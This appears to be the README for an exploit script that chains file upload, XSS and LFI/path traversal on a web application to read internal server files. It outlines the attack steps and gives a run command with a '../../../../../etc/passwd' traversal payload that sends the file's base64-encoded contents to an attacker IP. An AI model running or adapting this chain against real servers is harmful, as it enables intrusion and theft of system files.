# WebVulnsChainingAutomation
This script automates the process of exploiting a chain of web vulnerabilities, which include File Upload, XSS, LFI & Path Traversal, that allows you to read internal files from a web server.

The process goes like the following:
1. First we abuse a File Upload functionality in order to upload a malicious Markdown (.md) file that contains a script which makes a fetch to and endpoint that includes files through a ?file parameter in a way that is vulnerable to LFI.
2. There's an option to share the uploaded file, and a "Contact Us" form which is vulnerable to XSS, chaining this we are able to fetch resources to a web server from ourselves.
3. Finally we receive the contents encoded in base64 in our server, decode them and shem through the terminal, all with just one line.

To run the script:
`python3 vulnschain.py <file-to-read> <attacker-ip>`</br>
E.g. `python3 vulnschain.py ../../../../../etc/passwd 10.10.1.2`
